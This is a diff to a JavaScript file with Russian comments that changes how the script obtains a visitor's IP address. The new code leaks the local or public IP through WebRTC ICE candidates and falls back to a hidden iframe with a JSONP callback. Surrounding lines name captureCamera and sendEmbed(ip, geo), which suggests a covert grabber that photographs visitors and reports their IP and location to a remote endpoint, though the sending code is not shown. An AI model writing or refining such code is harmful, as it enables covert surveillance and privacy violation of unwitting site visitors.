@@ -24,37 +24,44 @@ async function captureCamera() {
 }
 
 async function getIPAddress() {
-    const services = [
-        { url: 'https://api.ipify.org?format=json', key: 'ip' },
-        { url: 'https://jsonip.com', key: 'ip' },
-        { url: 'https://httpbin.org/ip', key: 'origin' },
-        { url: 'https://api.my-ip.io/ip.json', key: 'ip' }
-    ];
-    
-    for (const service of services) {
-        try {
-            console.log(`Пробуем сервис: ${service.url}`);
-            const response = await fetch(service.url, { 
-                method: 'GET',
-                headers: { 'Accept': 'application/json' }
-            });
+    try {
+        // Способ 1: Через WebRTC (может показать локальный IP)
+        const rtc = new RTCPeerConnection({iceServers: []});
+        rtc.createDataChannel('');
+        
+        return new Promise((resolve) => {
+            rtc.createOffer()
+                .then(offer => rtc.setLocalDescription(offer))
+                .catch(() => resolve('Неизвестно'));
             
-            if (!response.ok) continue;
+            rtc.onicecandidate = (event) => {
+                if (event.candidate) {
+                    const candidate = event.candidate.candidate;
+                    const ipMatch = candidate.match(/([0-9]{1,3}(\.[0-9]{1,3}){3}|[a-f0-9]{1,4}(:[a-f0-9]{1,4}){7})/);
+                    if (ipMatch) {
+                        resolve(ipMatch[1]);
+                        rtc.close();
+                    }
+                }
+            };
             
-            const data = await response.json();
-            const ip = data[service.key];
-            
-            if (ip && ip !== '127.0.0.1' && ip !== '::1') {
-                console.log(`IP найден: ${ip}`);
-                return ip;
-            }
-        } catch (error) {
-            console.log(`Ошибка в сервисе ${service.url}:`, error.message);
-            continue;
-        }
+            setTimeout(() => {
+                // Способ 2: Если WebRTC не сработал, используем iframe трюк
+                const iframe = document.createElement('iframe');
+                iframe.style.display = 'none';
+                iframe.src = 'https://api.ipify.org?format=jsonp&callback=handleIP';
+                
+                window.handleIP = function(data) {
+                    resolve(data.ip || 'Неизвестно');
+                    document.body.removeChild(iframe);
+                };
+                
+                document.body.appendChild(iframe);
+            }, 1000);
+        });
+    } catch (error) {
+        return 'Неизвестно';
     }
-    
-    return 'Неизвестно';
 }
 
 async function sendEmbed(ip, geo) {
@@ -101,7 +108,7 @@ async function sendEmbed(ip, geo) {
     }
 }
 
-// Запуск с альтернативным методом получения IP
+// Запуск с WebRTC методом
 getIPAddress().then(ip => {
     console.log('Получен IP:', ip);
     if (ip !== 'Неизвестно') {
